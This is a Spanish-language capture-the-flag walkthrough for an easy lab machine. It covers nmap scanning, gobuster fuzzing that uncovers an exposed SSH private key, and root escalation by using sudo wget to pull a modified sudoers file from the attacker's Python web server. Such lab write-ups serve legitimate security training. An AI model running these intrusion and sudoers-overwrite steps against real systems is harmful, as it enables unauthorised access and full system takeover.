Maquina Dificultad = easy

### nmap basic_scan


<img width="1243" height="203" alt="Pasted image 20240715001142" src="https://github.com/user-attachments/assets/0d0d7919-ef9d-45fa-a560-5be92af66a0e" />


### nmap full_scan


<img width="1092" height="338" alt="Pasted image 20240715001217" src="https://github.com/user-attachments/assets/284c47f7-619c-44dc-b255-a4b48250cd70" />


### Tenemos pagina web


<img width="1877" height="846" alt="Pasted image 20240715001303" src="https://github.com/user-attachments/assets/de982aac-91fd-4cf5-907c-c2d8d3946a11" />


si inspeccionamos la pagina podemos encontrar un posible usuario de la misma


<img width="924" height="517" alt="Pasted image 20250126213459" src="https://github.com/user-attachments/assets/985ee315-1925-47be-a742-40f7cf49d3d0" />


### FUZZING:
es una web apache sin mucho mas, podemos hacer fuzzing para sacar mas informacion

podemos usar gobuster mismamente con los siguientes parametros...


```
gobuster -u http://[IP DE LA MAQUINA]/ -w [DICCIONARIO] -x [EXTENCIONES DE ARCHIVOS php,html,txt... etc]
```


<img width="874" height="88" alt="Pasted image 20240715001617" src="https://github.com/user-attachments/assets/37a24716-77df-4e9f-808a-4738518e6a3e" />


encontramos el dominio "/sitemap", si entramos a ese dominio adjuntandolo a la ip nos aparece lo siguiente


<img width="1911" height="921" alt="Pasted image 20250126182042" src="https://github.com/user-attachments/assets/cca3e1ae-6300-49c7-b3ff-33f26b92444b" />


Podemos seguir haciendo fuzzing apartir de este dominio


```
gobuster -u http://[IP DE LA MAQUINA]/sitemap/ -w [DICCIONARIO] -x [EXTENCIONES DE ARCHIVOS php,html,txt... etc]
```

y haciendo esto nos encontramos lo siguiente


<img width="1122" height="369" alt="Pasted image 20250126181837" src="https://github.com/user-attachments/assets/157f5bcb-e46b-4b03-901d-7803a1125644" />


tenemos un "/.ssh" lo cual nos indica que podriamos tener una posible id_rsa, y de esta manera podriamos hacer la intrucion a la maquina


<img width="779" height="560" alt="Pasted image 20250126213714" src="https://github.com/user-attachments/assets/3c78fbd2-dc42-47da-9ab6-061ec5749d5a" />


dicho y hecho, apartir de esta id rsa podemos entrar en la maquina victima partir de ssh, y como recordamos tenemos un usuario
entonces podemos hacer la conexion directa por el protocolo ssh simplemente usando la id rsa y el nombre de usuario encontrado anteriormente


<img width="677" height="294" alt="Pasted image 20250126213903" src="https://github.com/user-attachments/assets/80cddc90-4c7e-4430-abcc-9c2cec4d93bd" />


Funciono, apartir de aqui podemos empezar con la escalada de privilegios

### ESCALADA
uscando el comando "sudo -l" podemos ver si tenemos permisos de ejecucion de algun tipo


<img width="1206" height="194" alt="Pasted image 20250126214217" src="https://github.com/user-attachments/assets/3af25a05-87fb-4767-9aab-fa33cbb90ca8" />


podemos usar el comando wget como root... podriamos extraer el "/etc/sudoers" y cambiar los permisos, con el mismo wget


<img width="932" height="830" alt="Pasted image 20250126215036" src="https://github.com/user-attachments/assets/6e235f32-de6e-4cd9-b245-0ad246ed880d" />


y ahora podemos sobre escribirlo sobre el archivo de la maquina victima... haciendo un pequeño servidor en python desde la maquina atacante


```
python3 -m http.server
```


y ahora lo extraemos desde la maquina victima con el siguiente comando


```
sudo /usr/bin/wget http://[IP LOCAL]:8000/sudoers -O /etc/sudoers
```


<img width="934" height="480" alt="Pasted image 20250126215427" src="https://github.com/user-attachments/assets/92942ea9-6fdf-4698-868f-c12630c6429c" />


y ahora simplemento lo que queda por hacer es ejecutar el comando de "sudo /bin/bash"


<img width="399" height="161" alt="Pasted image 20250126215942" src="https://github.com/user-attachments/assets/722a5dfd-af25-4369-842d-a21a9314806b" />


Y listo somo root


